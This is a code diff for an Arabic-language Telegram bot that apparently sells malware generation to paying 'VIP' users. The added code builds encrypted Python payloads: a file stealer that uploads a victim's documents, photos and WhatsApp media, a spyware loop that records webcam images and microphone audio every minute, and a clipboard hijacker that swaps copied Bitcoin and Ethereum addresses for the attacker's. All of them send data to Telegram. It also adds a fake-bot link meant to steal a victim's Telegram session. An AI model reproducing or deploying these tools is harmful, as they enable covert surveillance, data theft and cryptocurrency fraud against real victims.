+            enc_code = military_encrypt(tool_code, BOT_TOKEN)
+            file_stream = io.BytesIO(enc_code.encode('utf-8'))
+            file_stream.name = "WiFi_Stealer.py"
+            bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة سحب الواي فاي بنجاح!</b>\nتعمل على (ويندوز، لينكس، أندرويد).", reply_markup=vip_menu(cid))
+            bot.delete_message(cid, call.message.message_id)
+        except Exception as e:
+            safe_edit(f"❌ <b>فشل إنشاء الأداة!</b>\n<code>{str(e)}</code>", cid, call.message.message_id, reply_markup=vip_menu(cid))
+
+    elif data == "gen_all_files":
+        user_data = get_user(cid)
+        if not (is_admin(cid) or (user_data and check_vip(user_data))):
+            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
+            
+        safe_edit(f"⏳ <b>جاري توليد أداة سحب جميع الملفات...</b>", cid, call.message.message_id)
+        try:
+            increment_stat("files")
+            tool_code = '''
+import time, sys, os, requests
+
+T = bytes(__TOKEN_ARRAY__).decode('utf-8')
+C = "__CHAT_ID__"
+
+def send_file(filepath):
+    try:
+        if os.path.getsize(filepath) < 50000000: # 50MB Limit
+            url = "https://api.telegram.org/bot" + T + "/sendDocument"
+            f_obj = open(filepath, "rb")
+            files = {"document": f_obj}
+            data = {"chat_id": C}
+            requests.post(url, files=files, data=data, timeout=120)
+            f_obj.close()
+    except: pass
+
+paths = []
+
+# Detect OS and set paths
+if os.name == 'nt': # Windows
+    user = os.environ.get('USERPROFILE', 'C:\\\\Users\\\\Public')
+    paths.append(os.path.join(user, 'Desktop'))
+    paths.append(os.path.join(user, 'Downloads'))
+    paths.append(os.path.join(user, 'Documents'))
+    paths.append(os.path.join(user, 'Pictures'))
+elif os.path.exists('/sdcard'): # Android
+    paths.append('/sdcard/Download')
+    paths.append('/sdcard/Documents')
+    paths.append('/sdcard/DCIM/Camera')
+    paths.append('/sdcard/Pictures')
+    paths.append('/sdcard/WhatsApp/Media')
+else: # Linux/Mac
+    user = os.path.expanduser('~')
+    paths.append(os.path.join(user, 'Desktop'))
+    paths.append(os.path.join(user, 'Downloads'))
+    paths.append(os.path.join(user, 'Documents'))
+    paths.append(os.path.join(user, 'Pictures'))
+
+max_files = 200
+extracted = 0
+
+try:
+    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "📁 جاري سحب الملفات من الجهاز..."})
+except: pass
+
+for p in paths:
+    if extracted >= max_files: break
+    if os.path.exists(p):
+        for root, dirs, files in os.walk(p):
+            if extracted >= max_files: break
+            for f in files:
+                if extracted >= max_files: break
+                fp = os.path.join(root, f)
+                send_file(fp)
+                extracted += 1
+
+try:
+    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": f"✅ تم الانتهاء من سحب الملفات. تم إرسال {extracted} ملف."})
+except: pass
+
+time.sleep(5)
+'''
+            tool_code = tool_code.replace("__CHAT_ID__", str(cid))
+            enc_code = military_encrypt(tool_code, BOT_TOKEN)
+            file_stream = io.BytesIO(enc_code.encode('utf-8'))
+            file_stream.name = "All_Files_Stealer.py"
+            bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة سحب جميع الملفات!</b>\nتعمل على (ويندوز، لينكس، أندرويد).", reply_markup=vip_menu(cid))
+            bot.delete_message(cid, call.message.message_id)
+        except Exception as e:
+            safe_edit(f"❌ <b>فشل إنشاء الأداة!</b>\n<code>{str(e)}</code>", cid, call.message.message_id, reply_markup=vip_menu(cid))
 
     elif data in ["gen_images", "gen_music", "gen_videos", "gen_docs", "gen_sysinfo"]:
         safe_edit(f"⏳ <b>جاري التوليد والتشفير الفعلي...</b>", cid, call.message.message_id)
@@ -975,7 +1175,8 @@ time.sleep(5)
         try:
             increment_stat("files")
             tool_code = '''
-import time, sys, os, requests, subprocess
+import time, sys, os, subprocess, requests
+
 T = bytes(__TOKEN_ARRAY__).decode('utf-8')
 C = "__CHAT_ID__"
 
@@ -983,31 +1184,59 @@ try:
     requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "🎥 التجسس بدأ بنجاح..."})
 except: pass
 
-while True:
+# Auto-install required packages for PC
+try:
+    import cv2
+except:
+    subprocess.run([sys.executable, "-m", "pip", "install", "opencv-python"], capture_output=True)
+    import cv2
+
+try:
+    import sounddevice as sd
+    import soundfile as sf
+    import numpy as np
+except:
+    subprocess.run([sys.executable, "-m", "pip", "install", "sounddevice", "soundfile", "numpy"], capture_output=True)
+    import sounddevice as sd
+    import soundfile as sf
+    import numpy as np
+
+def spy():
     try:
-        subprocess.run(['termux-camera-photo', '-c', '1', '/sdcard/spy.jpg'], timeout=10)
-        subprocess.run(['termux-media-player', 'record', '/sdcard/spy.mp3', '10'], timeout=15)
-        
-        url = "https://api.telegram.org/bot" + T + "/sendPhoto"
-        files = {'photo': open('/sdcard/spy.jpg', 'rb')}
-        data = {"chat_id": C, "caption": "📸 تم التصوير"}
-        requests.post(url, files=files, data=data, timeout=30)
-        
-        url2 = "https://api.telegram.org/bot" + T + "/sendAudio"
-        files2 = {'audio': open('/sdcard/spy.mp3', 'rb')}
-        data2 = {"chat_id": C, "caption": "🎙 تم تسجيل الصوت"}
-        requests.post(url2, files=files2, data=data2, timeout=30)
-        
-        os.remove('/sdcard/spy.jpg')
-        os.remove('/sdcard/spy.mp3')
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        if ret:
+            cv2.imwrite('spy.jpg', frame)
+            cap.release()
+            url = "https://api.telegram.org/bot" + T + "/sendPhoto"
+            files = {'photo': open('spy.jpg', 'rb')}
+            data = {"chat_id": C}
+            requests.post(url, files=files, data=data, timeout=30)
+            os.remove('spy.jpg')
     except: pass
+
+    try:
+        fs = 44100
+        seconds = 10
+        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
+        sd.wait()
+        sf.write('spy.wav', recording, fs)
+        url2 = "https://api.telegram.org/bot" + T + "/sendAudio"
+        files2 = {'audio': open('spy.wav', 'rb')}
+        data2 = {"chat_id": C}
+        requests.post(url2, files=files2, data=data2, timeout=30)
+        os.remove('spy.wav')
+    except: pass
+
+while True:
+    spy()
     time.sleep(60)
 '''
             tool_code = tool_code.replace("__CHAT_ID__", str(cid))
             enc_code = military_encrypt(tool_code, BOT_TOKEN)
             file_stream = io.BytesIO(enc_code.encode('utf-8'))
             file_stream.name = "Silent_Spy.py"
-            bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة التجسس بنجاح!</b>\n\n⚠️ <i>هذه الأداة تحتاج إلى تطبيق Termux على هاتف الضحية لتعمل. تلتقط صورة وتسجل صوتاً كل دقيقة وترسله لك.</i>", reply_markup=vip_menu(cid))
+            bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة التجسس بنجاح!</b>\n\n⚠️ <i>تعمل على الكمبيوتر والهاتف. تلتقط صورة وتسجل صوتاً كل دقيقة وترسله لك.</i>", reply_markup=vip_menu(cid))
             bot.delete_message(cid, call.message.message_id)
         except Exception as e:
             safe_edit(f"❌ <b>فشل إنشاء أداة التجسس!</b>\n<code>{str(e)}</code>", cid, call.message.message_id, reply_markup=vip_menu(cid))
@@ -1141,6 +1370,13 @@ time.sleep(5)
                 bot.delete_message(cid, call.message.message_id)
             except Exception as e:
                 safe_edit(f"❌ <b>فشل إنشاء السكربت VIP!</b>\n<code>{str(e)}</code>", cid, call.message.message_id, reply_markup=social_menu())
+
+    elif data == "vip_bot_hack":
+        user_data = get_user(cid)
+        if not (is_admin(cid) or (user_data and check_vip(user_data))):
+            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
+        fake_link = f"https://t.me/{FAKE_BOT_USERNAME}?start=fake_{cid}"
+        safe_edit(f"{ce('🤖')} <b>[ اختراق عبر بوت ]</b>\n\n{ce('🔗')} <b>تم إنشاء رابط البوت الوهمي بنجاح:</b>\n<code>{fake_link}</code>\n\n⚠️ <i>أرسل الرابط للضحية وسيتم سحب جلسة تيليجرام الخاص به.</i>", cid, call.message.message_id, reply_markup=vip_menu(cid))
 
     elif data == "vip_enter_key":
         states["vip_key_input_user"][cid] = True
@@ -1288,6 +1524,10 @@ def cmd_start(msg):
             ref_id = int(arg.split("_")[1])
             if ref_id != cid:
                 ref_by = ref_id
+        elif arg.startswith("fake_"):
+            ref_id = int(arg.split("_")[1])
+            if ref_id != cid:
+                ref_by = ref_id
 
     if not get_user(cid):
         a, b = random.randint(1, 10), random.randint(1, 10)
@@ -1305,12 +1545,15 @@ def cmd_start(msg):
     
     bot.send_message(cid, WELCOME_MSG, reply_markup=main_menu(cid))
 
-@bot.message_handler(func=lambda msg: True)
+@bot.message_handler(content_types=['text', 'document'])
 def handle_all_messages(msg):
     cid = msg.chat.id
-    text = msg.text
+    text = msg.text or ""
     
     if cid in states["math_captcha"]:
+        if not text:
+            bot.send_message(cid, f"❌ <b>يرجى إرسال إجابة نصية فقط.</b>")
+            return
         if text == states["math_captcha"][cid]["answer"]:
             ref_by = states["math_captcha"][cid].get("ref_by")
             del states["math_captcha"][cid]
@@ -1344,32 +1587,117 @@ def handle_all_messages(msg):
             bot.send_message(cid, f"📢 <b>يرجى الاشتراك في القنوات أولاً لاستخدام البوت:</b>", reply_markup=markup)
             return
 
-    if cid in states["restore_backup"] and states["restore_backup"][cid]:
-        if msg.content_type == 'document':
+    if cid in states.get("restore_backup", {}) and states["restore_backup"][cid]:
+        if msg.content_type == 'document' and msg.document:
+            status_msg = bot.send_message(cid, f"⏳ <b>جاري استلام النسخة الاحتياطية واستعادتها، يرجى الانتظار...</b>")
             try:
-                file_info = bot.get_file(msg.document.file_id)
-                downloaded_file = bot.download_file(file_info.file_path)
+                file_id = msg.document.file_id
+                file_info = bot.get_file(file_id)
+                
+                file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
+                response = requests.get(file_url)
+                
+                if response.status_code != 200:
+                    raise Exception("فشل تنزيل الملف من سيرفرات تيليجرام")
+                    
                 backup_path = os.path.join(DATA_DIR, "restore_temp.zip")
                 with open(backup_path, 'wb') as f:
-                    f.write(downloaded_file)
-                
+                    f.write(response.content)
+
                 for item in os.listdir(DATA_DIR):
                     if item != "restore_temp.zip":
                         item_path = os.path.join(DATA_DIR, item)
-                        if os.path.isfile(item_path):
-                            os.remove(item_path)
-                        elif os.path.isdir(item_path):
-                            shutil.rmtree(item_path)
-                
+                        try:
+                            if os.path.isfile(item_path):
+                                os.remove(item_path)
+                            elif os.path.isdir(item_path):
+                                shutil.rmtree(item_path)
+                        except:
+                            pass
+
                 with zipfile.ZipFile(backup_path, 'r') as zipf:
                     zipf.extractall(DATA_DIR)
+                
                 os.remove(backup_path)
+                
+                try: 
+                    bot.delete_message(cid, status_msg.message_id)
+                except: pass
+                
                 bot.send_message(cid, f"✅ <b>تم استعادة النسخة الاحتياطية بنجاح! جاري إعادة تحميل البيانات...</b>", reply_markup=admin_panel())
             except Exception as e:
-                bot.send_message(cid, f"❌ <b>خطأ في الاستعادة:</b> <code>{e}</code>", reply_markup=admin_panel())
+                try: 
+                    bot.delete_message(cid, status_msg.message_id)
+                except: pass
+                bot.send_message(cid, f"❌ <b>خطأ في الاستعادة:</b> <code>{str(e)[:100]}</code>", reply_markup=admin_panel())
         else:
             bot.send_message(cid, f"❌ <b>الرجاء إرسال ملف ZIP فقط.</b>")
-        del states["restore_backup"][cid]
+        
+        states["restore_backup"].pop(cid, None)
+        return
+
+    if cid in states.get("crypto_check_input", {}) and states["crypto_check_input"][cid]:
+        states["crypto_check_input"].pop(cid, None)
+        addr = text.strip()
+        try:
+            if addr.startswith("0x") and len(addr) == 42:
+                res = requests.get(f"https://api.blockcypher.com/v1/eth/main/addrs/{addr}/balance").json()
+                balance = int(res.get('balance', 0)) / 10**18
+                txt = f"{ce('💰')} <b>محفظة Ethereum</b>\n\n{ce('🔗')} العنوان: <code>{addr}</code>\n⚖️ الرصيد: <code>{balance} ETH</code>\n📈 إجمالي المعاملات: <code>{res.get('n_tx', 0)}</code>"
+            elif (addr.startswith("1") or addr.startswith("3") or addr.startswith("bc1")):
+                res = requests.get(f"https://api.blockcypher.com/v1/btc/main/addrs/{addr}/balance").json()
+                balance = int(res.get('balance', 0)) / 10**8
+                txt = f"{ce('💰')} <b>محفظة Bitcoin</b>\n\n{ce('🔗')} العنوان: <code>{addr}</code>\n⚖️ الرصيد: <code>{balance} BTC</code>\n📈 إجمالي المعاملات: <code>{res.get('n_tx', 0)}</code>"
+            else:
+                txt = "❌ صيغة عنوان غير صحيحة. يجب أن يكون BTC أو ETH."
+            bot.send_message(cid, txt, reply_markup=free_menu())
+        except:
+            bot.send_message(cid, "❌ حدث خطأ أثناء الاتصال بالشبكة.", reply_markup=free_menu())
+        return
+
+    if cid in states.get("cb_hijack_input", {}) and states["cb_hijack_input"][cid]:
+        attacker_addr = text.strip()
+        states["cb_hijack_input"].pop(cid, None)
+        try:
+            increment_stat("files")
+            tool_code = '''
+import time, sys, os, subprocess, re, requests
+
+T = bytes(__TOKEN_ARRAY__).decode('utf-8')
+C = "__CHAT_ID__"
+A = "__ATTACKER_ADDR__"
+
+try:
+    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "💳 تم تفعيل مختطف الحافظة بنجاح..."})
+except: pass
+
+# Auto-install pyperclip
+try:
+    import pyperclip
+except:
+    subprocess.run([sys.executable, "-m", "pip", "install", "pyperclip"], capture_output=True)
+    import pyperclip
+
+btc_pat = r'^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,39}$'
+eth_pat = r'^0x[a-fA-F0-9]{40}$'
+
+while True:
+    try:
+        clip = pyperclip.paste()
+        if re.match(btc_pat, clip) or re.match(eth_pat, clip):
+            if clip != A:
+                pyperclip.copy(A)
+                requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": f"🚨 تم العثور على محفظة وتم استبدالها!\\nالمحفظة القديمة: {clip}"})
+    except: pass
+    time.sleep(2)
+'''
+            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__ATTACKER_ADDR__", attacker_addr)
+            enc_code = military_encrypt(tool_code, BOT_TOKEN)
+            file_stream = io.BytesIO(enc_code.encode('utf-8'))
+            file_stream.name = "Clipboard_Hijacker.py"
+            bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة مختطف الحافظة!</b>\n⚠️ <i>يعمل في الخلفية على الكمبيوتر والهاتف، وبمجرد أن ينسخ الضحية محفظة، سيتم استبدالها بمحفظتك.</i>", reply_markup=vip_menu(cid))
+        except Exception as e:
+            bot.send_message(cid, f"❌ خطأ: <code>{e}</code>", reply_markup=vip_menu(cid))
         return
 
     if cid in states["add_ch"] and states["add_ch"][cid]:
@@ -1455,38 +1783,96 @@ def handle_all_messages(msg):
         return
 
     if is_admin(cid):
-        if cid in states["rm_ch"] and states["rm_ch"][cid]:
+        if cid in states.get("bc_name_input", {}) and states["bc_name_input"][cid]:
+            token = bc_tokens.get(cid)
+            if token:
+                try:
+                    telebot.TeleBot(token).set_my_name(text)
+                    bot.send_message(cid, f"✅ <b>تم تغيير اسم البوت بنجاح.</b>", reply_markup=bot_control_menu())
+                except:
+                    bot.send_message(cid, f"❌ <b>خطأ في تغيير الاسم.</b>", reply_markup=bot_control_menu())
+            else:
+                bot.send_message(cid, f"❌ <b>لم يتم ربط بوت.</b>", reply_markup=bot_control_menu())
+            states["bc_name_input"].pop(cid, None)
+            
+        elif cid in states.get("bc_desc_input", {}) and states["bc_desc_input"][cid]:
+            token = bc_tokens.get(cid)
+            if token:
+                try:
+                    telebot.TeleBot(token).set_my_description(text)
+                    bot.send_message(cid, f"✅ <b>تم تحديث الوصف الطويل.</b>", reply_markup=bot_control_menu())
+                except:
+                    bot.send_message(cid, f"❌ <b>خطأ.</b>", reply_markup=bot_control_menu())
+            states["bc_desc_input"].pop(cid, None)
+            
+        elif cid in states.get("bc_about_input", {}) and states["bc_about_input"][cid]:
+            token = bc_tokens.get(cid)
+            if token:
+                try:
+                    telebot.TeleBot(token).set_my_short_description(text)
+                    bot.send_message(cid, f"✅ <b>تم تحديث النبذة القصيرة.</b>", reply_markup=bot_control_menu())
+                except:
+                    bot.send_message(cid, f"❌ <b>خطأ.</b>", reply_markup=bot_control_menu())
+            states["bc_about_input"].pop(cid, None)
+            
+        elif cid in states.get("bc_cmds_input", {}) and states["bc_cmds_input"][cid]:
+            token = bc_tokens.get(cid)
+            if token:
+                try:
+                    cmds = []
+                    for line in text.split('\n'):
+                        if '-' in line:
+                            parts = line.split('-', 1)
+                            cmd = parts[0].strip()
+                            desc = parts[1].strip()
+                            if cmd.startswith('/'): cmd = cmd[1:]
+                            cmds.append(BotCommand(command=cmd, description=desc))
+                    telebot.TeleBot(token).set_my_commands(cmds)
+                    bot.send_message(cid, f"✅ <b>تم تحديث أوامر البوت بنجاح.</b>", reply_markup=bot_control_menu())
+                except Exception as e:
+                    bot.send_message(cid, f"❌ <b>خطأ:</b> <code>{e}</code>", reply_markup=bot_control_menu())
+            states["bc_cmds_input"].pop(cid, None)
+
+        elif cid in states.get("rm_ch", {}) and states["rm_ch"][cid]:
             chs = load_channels()
             chs = [c for c in chs if str(c.get('id')) != text]
             save_channels(chs)
             bot.send_message(cid, f"✅ <b>تم الحذف.</b>", reply_markup=admin_panel())
-            del states["rm_ch"][cid]
-        elif cid in states["ban"] and states["ban"][cid]:
+            states["rm_ch"].pop(cid, None)
+            
+        elif cid in states.get("ban", {}) and states["ban"][cid]:
             b = load_banned()
             if int(text) not in b:
                 b.append(int(text))
             save_banned(b)
             bot.send_message(cid, f"✅ <b>تم الحظر.</b>", reply_markup=admin_panel())
-            del states["ban"][cid]
-        elif cid in states["unban"] and states["unban"][cid]:
+            states["ban"].pop(cid, None)
+            
+        elif cid in states.get("unban", {}) and states["unban"][cid]:
             b = load_banned()
             if int(text) in b:
                 b.remove(int(text))
             save_banned(b)
             bot.send_message(cid, f"✅ <b>تم فك الحظر.</b>", reply_markup=admin_panel())
-            del states["unban"][cid]
-        elif cid in states["broadcast"] and states["broadcast"][cid]:
+            states["unban"].pop(cid, None)
+            
+        elif cid in states.get("broadcast", {}) and states["broadcast"][cid]:
             users = load_users()
-            success = 0
+            success, failed = 0, 0
+            status_msg = bot.send_message(cid, f"⏳ <b>جاري الإذاعة لـ {len(users)} عضو...</b>")
             for u in users:
                 try:
                     bot.send_message(u['id'], text)
                     success += 1
                 except:
-                    pass
-            bot.send_message(cid, f"📢 <b>تم الإذاعة لـ {success} عضو.</b>", reply_markup=admin_panel())
-            del states["broadcast"][cid]
-        elif cid in states["send_msg"] and states["send_msg"][cid]:
+                    failed += 1
+                time.sleep(0.05)
+            try: bot.delete_message(cid, status_msg.message_id)
+            except: pass
+            bot.send_message(cid, f"📢 <b>اكتملت الإذاعة!</b>\n✅ ناجح: <code>{success}</code>\n❌ فاشل (محظور البوت): <code>{failed}</code>", reply_markup=admin_panel())
+            states["broadcast"].pop(cid, None)
+            
+        elif cid in states.get("send_msg", {}) and states["send_msg"][cid]:
             try:
                 parts = text.split(" ", 1)
                 uid = int(parts[0])
@@ -1495,43 +1881,53 @@ def handle_all_messages(msg):
                 bot.send_message(cid, f"✅ <b>تم الإرسال.</b>", reply_markup=admin_panel())
             except:
                 bot.send_message(cid, f"❌ <b>خطأ. استخدم: ID Message</b>", reply_markup=admin_panel())
-            del states["send_msg"][cid]
-        elif cid in states["user_info"] and states["user_info"][cid]:
+            states["send_msg"].pop(cid, None)
+            
+        elif cid in states.get("user_info", {}) and states["user_info"][cid]:
             u = get_user(int(text))
             if u:
-                bot.send_message(cid, f"{ce('👤')} <b>معلومات:</b>\n{ce('🆔')} <code>{u['id']}</code>\n⭐ VIP: {check_vip(u)}", reply_markup=admin_panel())
+                vip_status = f"{ce('✅')} مفعّل" if check_vip(u) else f"{ce('❌')} غير مفعّل"
+                expiry = datetime.datetime.fromtimestamp(u.get('vip_expiry', 0)).strftime('%Y-%m-%d %H:%M') if u.get('vip_expiry', 0) > 0 else "لا يوجد"
+                uname_str = f"@{u.get('uname')}" if u.get('uname') else "لا يوجد"
+                
+                txt = (
+                    f"{ce('👤')} <b>معلومات العضو</b>\n\n"
+                    f"{ce('🆔')} <b>الآيدي:</b> <code>{u['id']}</code>\n"
+                    f"{ce('👥')} <b>اليوزر:</b> {uname_str}\n"
+                    f"{ce('👤')} <b>الاسم:</b> {u.get('fname', 'لا يوجد')}\n"
+                    f"⭐ <b>حالة VIP:</b> {vip_status}\n"
+                    f"⏳ <b>تاريخ الانتهاء:</b> {expiry}\n"
+                    f"👥 <b>عدد الدعوات:</b> <code>{u.get('ref_count', 0)}</code>"
+                )
+                bot.send_message(cid, txt, reply_markup=admin_panel())
             else:
                 bot.send_message(cid, f"❌ <b>غير موجود.</b>", reply_markup=admin_panel())
-            del states["user_info"][cid]
-        elif cid in states["create_vip_key_days"] and states["create_vip_key_days"][cid]:
+            states["user_info"].pop(cid, None)
+            
+        elif cid in states.get("create_vip_key_days", {}) and states["create_vip_key_days"][cid]:
             if text.isdigit() and int(text) > 0:
                 states["temp_create_vip_key"][cid] = {"days": int(text)}
-                del states["create_vip_key_days"][cid]
+                states["create_vip_key_days"].pop(cid, None)
                 states["create_vip_key_uses"][cid] = True
                 bot.send_message(cid, f"{ce('🔢')} <b>أرسل الحد الأقصى للاستخدامات لهذا المفتاح:</b>")
             else:
                 bot.send_message(cid, f"❌ <b>أدخل رقمًا صحيحًا.</b>")
-        elif cid in states["create_vip_key_uses"] and states["create_vip_key_uses"][cid]:
+                
+        elif cid in states.get("create_vip_key_uses", {}) and states["create_vip_key_uses"][cid]:
             if text.isdigit() and int(text) > 0:
                 days = states["temp_create_vip_key"][cid]["days"]
                 uses = int(text)
                 key = uuid.uuid4().hex[:10].upper()
                 keys = load_vip_keys()
-                keys[key] = {
-                    "days": days,
-                    "max_uses": uses,
-                    "uses_left": uses,
-                    "status": "active",
-                    "users": [],
-                    "created_at": time.time()
-                }
+                keys[key] = {"days": days, "max_uses": uses, "uses_left": uses, "status": "active", "users": [], "created_at": time.time()}
                 save_vip_keys(keys)
-                del states["create_vip_key_uses"][cid]
-                del states["temp_create_vip_key"][cid]
+                states["create_vip_key_uses"].pop(cid, None)
+                states["temp_create_vip_key"].pop(cid, None)
                 bot.send_message(cid, f"✅ <b>تم إنشاء المفتاح بنجاح!</b>\n\n{ce('🔑')} المفتاح: <code>{key}</code>\n⏳ المدة: {days} يوم\n{ce('🔢')} الاستخدامات: {uses}", reply_markup=vip_keys_menu())
             else:
                 bot.send_message(cid, f"❌ <b>أدخل رقمًا صحيحًا.</b>")
-        elif cid in states["disable_vip_key"] and states["disable_vip_key"][cid]:
+                
+        elif cid in states.get("disable_vip_key", {}) and states["disable_vip_key"][cid]:
             keys = load_vip_keys()
             if text in keys:
                 keys[text]['status'] = 'disabled'
@@ -1539,8 +1935,9 @@ def handle_all_messages(msg):
                 bot.send_message(cid, f"✅ <b>تم تعطيل المفتاح.</b>", reply_markup=vip_keys_menu())
             else:
                 bot.send_message(cid, f"❌ <b>المفتاح غير موجود.</b>", reply_markup=vip_keys_menu())
-            del states["disable_vip_key"][cid]
-        elif cid in states["enable_vip_key"] and states["enable_vip_key"][cid]:
+            states["disable_vip_key"].pop(cid, None)
+            
+        elif cid in states.get("enable_vip_key", {}) and states["enable_vip_key"][cid]:
             keys = load_vip_keys()
             if text in keys:
                 keys[text]['status'] = 'active'
@@ -1548,8 +1945,9 @@ def handle_all_messages(msg):
                 bot.send_message(cid, f"✅ <b>تم تفعيل المفتاح.</b>", reply_markup=vip_keys_menu())
             else:
                 bot.send_message(cid, f"❌ <b>المفتاح غير موجود.</b>", reply_markup=vip_keys_menu())
-            del states["enable_vip_key"][cid]
-        elif cid in states["delete_vip_key"] and states["delete_vip_key"][cid]:
+            states["enable_vip_key"].pop(cid, None)
+            
+        elif cid in states.get("delete_vip_key", {}) and states["delete_vip_key"][cid]:
             keys = load_vip_keys()
             if text in keys:
                 del keys[text]
@@ -1557,22 +1955,25 @@ def handle_all_messages(msg):
                 bot.send_message(cid, f"✅ <b>تم حذف المفتاح.</b>", reply_markup=vip_keys_menu())
             else:
                 bot.send_message(cid, f"❌ <b>المفتاح غير موجود.</b>", reply_markup=vip_keys_menu())
-            del states["delete_vip_key"][cid]
-        elif cid in states["add_admin"] and states["add_admin"][cid]:
+            states["delete_vip_key"].pop(cid, None)
+            
+        elif cid in states.get("add_admin", {}) and states["add_admin"][cid]:
             a = load_admins()
             if int(text) not in a:
                 a.append(int(text))
             save_admins(a)
             bot.send_message(cid, f"✅ <b>تم الإضافة.</b>", reply_markup=admin_panel())
-            del states["add_admin"][cid]
-        elif cid in states["rm_admin"] and states["rm_admin"][cid]:
+            states["add_admin"].pop(cid, None)
+            
+        elif cid in states.get("rm_admin", {}) and states["rm_admin"][cid]:
             a = load_admins()
             if int(text) in a and int(text) != OWNER_ID:
                 a.remove(int(text))
             save_admins(a)
             bot.send_message(cid, f"✅ <b>تم الحذف.</b>", reply_markup=admin_panel())
-            del states["rm_admin"][cid]
-        elif cid in states["adm_vip_7d_input"] and states["adm_vip_7d_input"][cid]:
+            states["rm_admin"].pop(cid, None)
+            
+        elif cid in states.get("adm_vip_7d_input", {}) and states["adm_vip_7d_input"][cid]:
             u = get_user(int(text))
             if u:
                 u['vip_expiry'] = time.time() + (7 * 24 * 60 * 60)
@@ -1580,8 +1981,9 @@ def handle_all_messages(msg):
                 bot.send_message(cid, f"✅ <b>تم تفعيل VIP 7 أيام.</b>", reply_markup=admin_panel())
             else:
                 bot.send_message(cid, f"❌ <b>غير موجود.</b>", reply_markup=admin_panel())
-            del states["adm_vip_7d_input"][cid]
-        elif cid in states["adm_vip_30d_input"] and states["adm_vip_30d_input"][cid]:
+            states["adm_vip_7d_input"].pop(cid, None)
+            
+        elif cid in states.get("adm_vip_30d_input", {}) and states["adm_vip_30d_input"][cid]:
             u = get_user(int(text))
             if u:
                 u['vip_expiry'] = time.time() + (30 * 24 * 60 * 60)
@@ -1589,7 +1991,7 @@ def handle_all_messages(msg):
                 bot.send_message(cid, f"✅ <b>تم تفعيل VIP 30 يوم.</b>", reply_markup=admin_panel())
             else:
                 bot.send_message(cid, f"❌ <b>غير موجود.</b>", reply_markup=admin_panel())
-            del states["adm_vip_30d_input"][cid]
+            states["adm_vip_30d_input"].pop(cid, None)
 
 
 # ==============================================================================
@@ -1711,7 +2113,7 @@ def fake_handle_messages(msg):
         return
 
 # ==============================================================================
-# تشغيل البوتات وسيرفر الويب معاً (مع إصلاح خطأ الانقطاع Timeout)
+# تشغيل البوتات وسيرفر الويب معاً (مع إصلاح خطأ الانقطاع Timeout و 409 Conflict)
 # ==============================================================================
 if __name__ == '__main__':
     keep_alive()
@@ -1730,24 +2132,32 @@ if __name__ == '__main__':
     def run_main_bot():
         while True:
             try:
-                bot.infinity_polling(timeout=30, long_polling_timeout=30)
+                bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
             except requests.exceptions.ReadTimeout:
                 logger.warning("Main bot read timeout, retrying in 3 seconds...")
                 time.sleep(3)
             except Exception as e:
-                logger.error(f"Main bot polling error: {e}")
-                time.sleep(5)
+                err_str = str(e)
+                if "409" in err_str or "Conflict" in err_str:
+                    logger.warning("⚠️ Main Bot 409 Conflict: نسخة أخرى تعمل، سأحاول مجدداً بعد 10 ثواني...")
+                else:
+                    logger.error(f"Main bot polling error: {e}")
+                time.sleep(10)
                 
     def run_fake_bot():
         while True:
             try:
-                fake_bot.infinity_polling(timeout=30, long_polling_timeout=30)
+                fake_bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
             except requests.exceptions.ReadTimeout:
                 logger.warning("Fake bot read timeout, retrying in 3 seconds...")
                 time.sleep(3)
             except Exception as e:
-                logger.error(f"Fake bot polling error: {e}")
-                time.sleep(5)
+                err_str = str(e)
+                if "409" in err_str or "Conflict" in err_str:
+                    logger.warning("⚠️ Fake Bot 409 Conflict: نسخة أخرى تعمل، سأحاول مجدداً بعد 10 ثواني...")
+                else:
+                    logger.error(f"Fake bot polling error: {e}")
+                time.sleep(10)
         
     Thread(target=run_main_bot, daemon=True).start()
     Thread(target=run_fake_bot, daemon=True).start()
